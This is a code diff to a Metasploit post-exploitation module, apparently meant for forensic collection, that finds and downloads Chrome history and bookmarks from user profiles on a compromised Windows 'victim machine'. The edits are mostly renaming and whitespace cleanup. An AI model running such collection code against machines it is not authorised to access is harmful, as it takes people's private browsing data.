@@ -18,8 +18,8 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-        'Name' => 'grab_artifacts [checks for and grabs forensically-interesting artifacts]',
-        'Description' => %q{'Captures forensically-interesting data from the victim machine.'},
+        'Name' => 'Grab Forensic Artifacts',
+        'Description' => %q{'Searches for, and pulls, forensically-interesting data from the victim machine.'},
         'License' => MSF_LICENSE,
         'Author' => [ 'Joshua Harper GCFE GCFA GSEC PI, Lt. West Campus Cyber Command, University of Texas Austin (@JonValt) <josh at radixtx dot com>'],
         'Platform' => %w{ win },
@@ -31,9 +31,7 @@ class Metasploit3 < Msf::Post
         OptInt.new('TIMEOUT', [true ,'Timeout in seconds when downloading file on a shell session.', 120]),
       ], self.class)
   end
- 
-  #Generic Ruby Stuff for my personal reference
- 
+ #Generic Ruby Stuff for my personal reference
   def run
     print_status("Hello from Metasploit! It is a pleasure to serve you today.")
     print_status("Grabbing User Profiles")
@@ -45,11 +43,8 @@ class Metasploit3 < Msf::Post
        chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Archived History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
        chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Bookmarks.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
     end
-  end   
-    
- 
-  
-def check_artifact(path, user, artifact_name, artifact_dir)
+  end
+  def check_artifact(path, user, artifact_name, artifact_dir)
    print_status("Checking for #{artifact_name} artifacts...")
    dirs = []
     if session.type =~ /meterpreter/
@@ -68,8 +63,7 @@ def check_artifact(path, user, artifact_name, artifact_dir)
     print_error("#{artifact_name} directory not found for #{user}")
     return false
   end
-
-    # Download Artifact's forensically-interesting file using store_local to preserve filename and some forensic metadata and make it easier to use with forensics software
+  # Download Artifact's forensically-interesting file using store_local to preserve filename and some forensic metadata and make it easier to use with forensics software
 
   def download_artifact(path, profile, artifact_name, artifact_dir, artifact_filename, artifact_filetype)
     if session.type =~ /meterpreter/
